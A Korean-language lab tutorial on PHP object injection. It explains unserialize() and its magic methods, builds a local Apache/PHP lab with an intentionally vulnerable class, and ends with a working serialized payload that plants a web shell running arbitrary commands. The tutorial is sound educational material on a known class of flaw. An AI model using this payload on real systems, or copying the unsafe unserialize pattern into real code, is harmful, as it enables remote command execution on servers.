# unserialize

직렬화된 데이터를 저장된 형태로 변환하는 함수이다.

오브젝트 생성 시 호출되는 Magic Method는 생성자(__construct)이고, 

오브젝트가 소멸 시 호출되는 Magic Method는 소멸자(__destruct)이다.

역직렬화(unserialize)는 __wakeup 후 __destruct가 호출된다.

다음 예제처럼 역직렬화와 소멸자를 이용하여 공격해보자.

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [Object Injection](#Object-Injection)**


# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |

apache와 php를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php
```

취약한 class가 포함된 php파일을 생성하자.

```php
<?php
	class LoggingClass {
		function __construct($filename, $content) {
			$this->filename = "/var/www/html/log/".$filename . ".log";
			$this->content = $content;
		}
		
		function __destruct() {
			file_put_contents($this->filename, $this->content, FILE_APPEND);
		}
	}
	$test1 = new LoggingClass('hello', 'world'.PHP_EOL);
	echo serialize($test1)."<br>";
	$data = unserialize($_GET['data']);
?>
```

해당 파일이 동작하기 위해서는 file_put_contents함수로 파일에 접근 시 권한이 있어야 한다.

```sh
root@ubuntu:/var/www/html# mkdir log
root@ubuntu:/var/www/html# chown -R www-data:www-data log
```

# **Object Injection**

페이지에 접근하면 다음과 같은 직렬화된 데이터가 나온다.

    O:12:"LoggingClass":2:{s:8:"filename";s:27:"/var/www/html/log/hello.log";s:7:"content";s:6:"world ";}

소멸자가 호출될 때 파일을 생성하므로 다음과 같이 데이터를 GET method로 전달하면 /log/shell.php가 생성된다.

    O:12:"LoggingClass":2:{s:8:"filename";s:27:"/var/www/html/log/shell.php";s:7:"content";s:29:"<?php system($_GET["cmd"]);?>";}